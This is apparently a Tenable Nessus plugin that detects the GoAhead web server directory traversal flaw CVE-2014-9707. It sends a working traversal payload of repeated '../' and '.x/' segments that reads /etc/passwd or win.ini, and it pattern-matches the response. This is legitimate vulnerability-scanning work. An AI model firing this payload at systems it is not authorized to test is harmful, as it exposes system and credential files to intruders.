#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(82566);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/04/06 13:24:15 $");

  script_cve_id("CVE-2014-9707");
  script_bugtraq_id(73404);
  script_osvdb_id(120027);

  script_name(english:"GoAhead Embedded Web Server websNormalizeUriPath() Directory Traversal Vulnerability");
  script_summary(english:"Attempts to exploit a directory traversal vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote GoAhead embedded web server is affected by a directory
traversal vulnerability due to a flaw in the websNormalizeUriPath()
function. A remote, unauthenticated attacker can exploit this flaw to
obtain arbitrary files on the affected host.

The flaw that allows the directory traversal may also be used to
perform a heap-based buffer overflow, potentially allowing code
execution or a denial of service condition.");
  # https://github.com/embedthis/goahead/commit/eed4a7d177bf94a54c7b06ccce88507fbd76fb77
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a935864f");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2015/q1/1028");
  script_set_attribute(attribute:"solution", value:
"Contact the vendor of the device running the GoAhead embedded web
server for a fixed version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date",value:"2014/11/24");
  script_set_attribute(attribute:"patch_publication_date",value:"2014/11/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/04/03");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:embedthis:goahead");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "GoAhead HTTP Server";

port = get_http_port(default:80, embedded:TRUE);

server = http_server_header(port:port);

if(server !~ "^\s*GoAhead-")
  audit(AUDIT_NOT_LISTEN, app, port);

file_pats = make_array();

file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = '^(\\[[A-Za-z]+\\]|^; for 16-bit app support|\\[MCI Extensions.BAK\\])';
file_pats['/windows/win.ini'] = '^(\\[[A-Za-z]+\\]|^; for 16-bit app support|\\[MCI Extensions.BAK\\])';

traversal_depth = 10;

report_file = '';

foreach file (keys(file_pats))
{

  exploit_uri = mult_str(str:"../", nb:traversal_depth);
  exploit_uri += mult_str(str:".x/", nb:traversal_depth);
  exploit_uri += substr(file,1);

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : exploit_uri,
    exit_on_fail : TRUE
  );

  if(res[2] =~ file_pats[file])
  {
    report_file = file;
    break;
  }
}

if(report_file == '')
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:'/', port:port));

security_report_v4(port     : port,
                   severity : SECURITY_HOLE,
                   output   : res[2],
                   file     : report_file,
                   request  : make_list(build_url(port:port, qs:exploit_uri)));
